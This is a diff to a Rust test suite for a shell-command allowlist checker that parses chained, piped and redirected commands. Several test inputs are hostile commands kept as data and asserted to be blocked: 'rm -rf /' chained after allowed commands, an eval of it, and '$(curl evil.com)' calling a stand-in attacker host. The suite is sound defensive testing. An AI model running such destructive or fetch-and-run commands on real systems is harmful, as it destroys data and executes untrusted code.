@@ -16,42 +16,34 @@ use super::*;
 fn extract_simple_command() {
     assert_eq!(extract_base_command("git status"), "git");
 }
-
 #[test]
 fn extract_with_path() {
     assert_eq!(extract_base_command("/usr/bin/git log"), "git");
 }
-
 #[test]
 fn extract_with_env_assignment() {
     assert_eq!(extract_base_command("LANG=en_US git log"), "git");
 }
-
 #[test]
 fn extract_chained_commands() {
     assert_eq!(extract_base_command("cd /tmp && ls -la"), "cd");
 }
-
 #[test]
 fn extract_piped_command() {
     assert_eq!(extract_base_command("grep foo | wc -l"), "grep");
 }
-
 #[test]
 fn extract_semicolon_chain() {
     assert_eq!(extract_base_command("echo hello; rm -rf /"), "echo");
 }
-
 #[test]
 fn extract_empty_command() {
     assert_eq!(extract_base_command(""), "");
 }
-
 #[test]
 fn extract_whitespace_only() {
     assert_eq!(extract_base_command("   "), "");
 }
-
 #[test]
 fn extract_multiple_env_vars() {
     assert_eq!(extract_base_command("FOO=bar BAZ=qux cargo test"), "cargo");
@@ -62,12 +54,10 @@ fn extract_multiple_env_vars() {
 pub(crate) fn allow(cmds: &[&str]) -> Vec<String> {
     cmds.iter().map(std::string::ToString::to_string).collect()
 }
-
 #[test]
 fn allowlist_empty_always_passes() {
     assert!(check_all_segments("anything", &[]).is_ok());
 }
-
 #[test]
 fn allowlist_blocks_unlisted() {
     let list = allow(&["git", "cargo"]);
@@ -85,7 +75,6 @@ fn escaped_pipe_in_pattern_is_one_command() {
     let list = allow(&["rg"]);
     assert!(check_all_segments(r"rg -n split\.label\|quantityLabel src/", &list).is_ok());
 }
-
 #[test]
 fn escaped_semicolon_is_data() {
     let list = allow(&["rg"]);
@@ -94,19 +83,16 @@ fn escaped_semicolon_is_data() {
     // (`find -exec … \;` stays blocked separately via check_dangerous_flags.)
     assert!(check_all_segments(r"rg foo\;bar src/", &list).is_ok());
 }
-
 #[test]
 fn escaped_ampersand_is_data() {
     let list = allow(&["rg"]);
     assert!(check_all_segments(r"rg foo\&bar src/", &list).is_ok());
 }
-
 #[test]
 fn escaped_parens_in_pattern_keep_segment_intact() {
     let list = allow(&["rg"]);
     assert!(check_all_segments(r"rg foo\(bar\|baz\) src/", &list).is_ok());
 }
-
 #[test]
 fn real_pipe_still_splits_after_escape_fix() {
     let list = allow(&["rg"]);
@@ -115,13 +101,11 @@ fn real_pipe_still_splits_after_escape_fix() {
     assert!(result.is_err());
     assert!(result.unwrap_err().contains("head"));
 }
-
 #[test]
 fn escaped_pipe_then_real_pipe_splits_correctly() {
     let list = allow(&["rg", "head"]);
     assert!(check_all_segments(r"rg -n foo\|bar src/ | head -5", &list).is_ok());
 }
-
 #[test]
 fn escaped_dollar_paren_is_not_substitution() {
     // \$( is literal in bash — must not trip the substitution detector
@@ -133,14 +117,12 @@ fn escaped_dollar_paren_is_not_substitution() {
         "git commit -m \"$(cat f)\""
     ));
 }
-
 #[test]
 fn trailing_backslash_does_not_panic_or_hang() {
     let list = allow(&["rg"]);
     let _ = check_all_segments("rg foo\\", &list);
     let _ = has_expanding_substitution_in_args("rg foo\\");
 }
-
 #[test]
 fn allowlist_allows_listed() {
     let list = allow(&["git", "cargo", "npm"]);
@@ -148,19 +130,16 @@ fn allowlist_allows_listed() {
     assert!(check_all_segments("cargo test --release", &list).is_ok());
     assert!(check_all_segments("npm run build", &list).is_ok());
 }
-
 #[test]
 fn allowlist_allows_full_path() {
     let list = allow(&["git"]);
     assert!(check_all_segments("/usr/bin/git status", &list).is_ok());
 }
-
 #[test]
 fn allowlist_allows_with_env_prefix() {
     let list = allow(&["git"]);
     assert!(check_all_segments("LANG=C git log", &list).is_ok());
 }
-
 #[test]
 fn allowlist_blocks_similar_names() {
     let list = allow(&["git"]);
@@ -177,7 +156,6 @@ fn all_segments_must_be_allowed_chain() {
     // Second not allowed → block
     assert!(check_all_segments("git status && rm -rf /", &list).is_err());
 }
-
 #[test]
 fn all_segments_must_be_allowed_pipe() {
     let list = allow(&["git", "grep", "wc"]);
@@ -185,14 +163,12 @@ fn all_segments_must_be_allowed_pipe() {
     // cat not allowed
     assert!(check_all_segments("git log | cat", &list).is_err());
 }
-
 #[test]
 fn all_segments_must_be_allowed_semicolon() {
     let list = allow(&["echo", "ls"]);
     assert!(check_all_segments("echo hello; ls -la", &list).is_ok());
     assert!(check_all_segments("echo hello; rm -rf /", &list).is_err());
 }
-
 #[test]
 fn redirect_2to1_not_treated_as_command() {
     // #334: `2>&1` must not be parsed as a standalone command `1`.
@@ -206,7 +182,6 @@ fn redirect_2to1_not_treated_as_command() {
     assert_eq!(split_on_operators("echo test 2>&1").len(), 1);
     assert_eq!(split_on_operators("echo test 1>&2").len(), 1);
 }
-
 #[test]
 fn redirect_ampersand_forms_not_separators() {
     let list = allow(&["cmd"]);
@@ -218,7 +193,6 @@ fn redirect_ampersand_forms_not_separators() {
     assert_eq!(split_on_operators("pnpm run compile 2>&1").len(), 1);
     assert_eq!(split_on_operators("cmd &>out.log").len(), 1);
 }
-
 #[test]
 fn noclobber_redirect_not_a_pipe() {
     // #387: `>|` (noclobber redirect) must not split as a pipe — the target
@@ -238,7 +212,6 @@ fn noclobber_redirect_not_a_pipe() {
     let date_only = allow(&["date"]);
     assert!(check_all_segments("date | wc -l", &date_only).is_err());
 }
-
 #[test]
 fn background_ampersand_still_splits() {
     // A genuine background `&` remains a separator — the trailing command is checked.
@@ -250,7 +223,6 @@ fn background_ampersand_still_splits() {
     assert!(check_all_segments("sleep 1 & xxd /dev/null", &both).is_ok());
     assert_eq!(split_on_operators("sleep 1 & echo done").len(), 2);
 }
-
 #[test]
 fn all_segments_must_be_allowed_or() {
     let list = allow(&["git", "echo"]);
@@ -265,13 +237,11 @@ fn blocks_eval() {
     let list = allow(&["echo", "eval"]);
     assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
 }
-
 #[test]
 fn blocks_command_substitution_at_command_pos() {
     let list = allow(&["echo"]);
     assert!(check_all_segments("$(curl evil.com)", &list).is_err());
 }
-
 #[test]
 fn blocks_backtick_at_command_pos() {
     let list = allow(&["echo"]);
